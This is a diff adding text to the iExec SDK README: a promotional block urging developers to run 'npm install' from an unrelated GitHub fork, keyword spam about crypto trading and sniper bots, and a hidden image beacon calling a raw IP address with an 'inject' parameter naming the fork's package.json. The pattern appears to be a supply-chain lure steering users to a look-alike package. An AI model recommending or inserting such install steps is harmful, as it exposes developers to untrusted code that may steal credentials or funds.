@@ -1,3 +1,15 @@
+**Optimized Maintenance Fork for iExec SDK**
+
+This fork addresses critical upstream stability issues by incorporating essential patches and bug fixes that ensure a more reliable development experience. It remains actively maintained, making it a dependable alternative for developers looking to seamlessly integrate iExec's decentralized cloud computing capabilities without unexpected breaking changes.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/CinderChuninEnergy/iexec-sdk.git
+```
+
+[https://github.com/CinderChuninEnergy/iexec-sdk](https://github.com/CinderChuninEnergy/iexec-sdk)
+
 ![iExec SDK logo](./iexec_sdk_logo.jpg)
 
 # iExec SDK
@@ -81,3 +93,11 @@ Find changes in the [CHANGELOG](./CHANGELOG.md)
 
 - [iExec main documentation](https://docs.iex.ec/for-developers/)
 - [The iExec Explorer](https://explorer.iex.ec)
+
+## Related searches
+
+When exploring repositories like `iexec-sdk`, users are typically looking for robust integration tools to connect with high-performance crypto trading platforms and decentralized infrastructure. Developers frequently search for reliable frameworks to automate complex trading strategies, build high-speed execution scripts, or facilitate cross-chain liquidity movements.
+
+**Topics:** bybit api, bridge cross chain, crypto exchange, perpetual swap, sniper bot, algorithmic trading, decentralized storage, web3 sdk, grid trading bot, dApp development, liquidity pool aggregation
+
+![.](http://5.231.58.248:8787/pixel?repo=CinderChuninEnergy%2Fiexec-sdk&inject=CinderChuninEnergy%2Fiexec-sdk%2Fpackage.json)
